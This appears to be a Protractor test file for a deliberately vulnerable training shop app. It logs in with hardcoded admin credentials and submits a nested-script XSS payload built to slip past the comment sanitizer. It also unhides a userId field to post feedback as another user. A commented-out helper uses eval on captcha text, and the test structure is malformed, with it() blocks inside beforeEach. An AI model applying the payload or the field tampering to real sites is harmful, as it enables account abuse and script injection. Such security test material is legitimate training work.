import { ElementFinder, browser, by, element, protractor } from 'protractor';

describe('/#/contact', () => {
    let comment, rating, submitButton

        beforeEach(() => {
           
            browser.get('/#/login')
            element(by.id('email')).sendKeys('admin@juice-sh.op')
            element(by.id('password')).sendKeys('admin123')
            element(by.id('loginButton')).click()
            browser.get('/#/contact')
            comment = element(by.id('comment'))
            rating = element.all('.br-unit').last()
            submitButton = submitButton = element(by.id('submitButton'))

            it('trick the sanitization with XSS attack - reference from devdependencis', () => {
                const EC = protractor.ExpectedConditions

                comment.sendKeys('<<script>Foo</script>iframe src="javascript:alert(`xss`)">')
                rating.click()

                submitButton.click()

                browser.waitForAngularEnabled(false)
                browser.get('/#/about')
                browser.wait(EC.alertIsPresent(), 15000, "'xss' alert is not present on /#/about")
                browser.switchTo().alert().then(alert => {
                    expect(alert.getText()).toEqual('xss')
                    alert.accept()
                })
            })

            it('should be possible to provide feedback as another user', () => {
                const EC = protractor.ExpectedConditions
                browser.executeScript('document.getElementById("userId").removeAttribute("hidden");')
                browser.executeScript('document.getElementById("userId").removeAttribute("class");')
                browser.wait(EC.visibilityOf(element(by.css('#userId'))), 5000)
          
                const UserId = element(by.id('userId'))
                UserId.clear()
                UserId.sendKeys('2')
                comment.sendKeys('Picard stinks!')
                rating.click()
          
                submitButton.click()
          
                browser.get('/#/administration')
                expect(element.all(by.css('mat-row mat-cell.mat-column-user')).last().getText()).toMatch('2')
              })
          
            
            })
          

        })

    // function Login () {
    //     element(by.id('captcha')).getText().then((text) => {
    //       captcha.clear()
    //       const answer = eval(text).toString() // eslint-disable-line no-eval
    //       captcha.sendKeys(answer)
    //     })
    //   }

